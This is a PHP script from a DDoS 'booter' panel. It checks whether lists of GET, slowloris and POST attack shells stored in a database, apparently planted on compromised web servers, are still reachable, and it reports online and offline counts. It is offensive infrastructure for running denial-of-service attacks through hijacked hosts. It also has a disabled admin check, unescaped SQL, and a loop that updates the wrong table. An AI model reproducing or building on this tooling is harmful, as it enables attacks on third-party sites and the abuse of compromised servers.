<?php

/**
 * Shell Scanner 4 PRODIGY's Booter
 * Coded By : n1tr0b - http://synfyre.net - Copyright SyrGoo Web 2010-2011
 * --
 * You have no right to redistribute or sell this script. Unless you contact n1tr0b via Facebook
 * n1tr0b@facebook.com
 */

/** Check for refers **/
if($_SERVER['HTTP_REFERER'] == '') {
    die("[1] : Access Denied");
}
/** Check for cURL **/
if(!function_exists('curl_init')) {
    die("This script needs cURL");
}

error_reporting(E_ALL ^ E_NOTICE);
include_once 'dbc.php';
include_once "includes/functions.php";
$c = array();

/*
/** Check Permissions
if (!checkAdmin()) {
    die("[1] : Access Denied");
}
*/
$time = time();


/** Get Shells **/
$q = mysql_query("SELECT * FROM `getshells`");
while ($r = mysql_fetch_assoc($q)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $r['URL']);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_VERBOSE, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);

    $page = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode >= 200 && $httpcode < 300) {
         mysql_query("UPDATE `getshells` SET `online` = '1', `lastCheck` = '{$time}' WHERE `URL` = '{$r['URL']}'");
         $c['ol']++;
    } else {
        $time = time();
        mysql_query("UPDATE `getshells` SET `online` = '0', `lastCheck` = '{$time}' WHERE `URL` = '{$r['URL']}'");
        $c['of']++;
    }
}
/** Sloworis Shells **/
$q = mysql_query("SELECT * FROM `slowloris`");
while ($r = mysql_fetch_assoc($q)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $r['URL']);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_VERBOSE, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);

    $page = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode >= 200 && $httpcode < 300) {
         mysql_query("UPDATE `slowloris` SET `online` = '1', `lastCheck` = '{$time}' WHERE `URL` = '{$r['URL']}'");
         $c['ol']++;
    } else {
        $time = time();
        mysql_query("UPDATE `slowloris` SET `online` = '0', `lastCheck` = '{$time}' WHERE `URL` = '{$r['URL']}'");
        $c['of']++;
    }
}
/** Post Shells **/
$q = mysql_query("SELECT * FROM `postshells`");
while ($r = mysql_fetch_assoc($q)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $r['URL']);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_VERBOSE, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);

    $page = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode >= 200 && $httpcode < 300) {
         mysql_query("UPDATE `getshells` SET `online` = '1', `lastCheck` = '{$time}' WHERE `URL` = '{$r['URL']}'");
         $c['ol']++;
    } else {
        mysql_query("UPDATE `getshells` SET `online` = '0', `lastCheck` = '{$time}' WHERE `URL` = '{$r['URL']}'");
        $c['of']++;
    }
}

if($c['ol'] == '') {
    $c['ol'] = 0;
}

if($c['of'] == '') {
    $c['of'] = 0;
}

 echo "All shells checked, Online : {$c['ol']}, Offline : {$c['of']}";
?>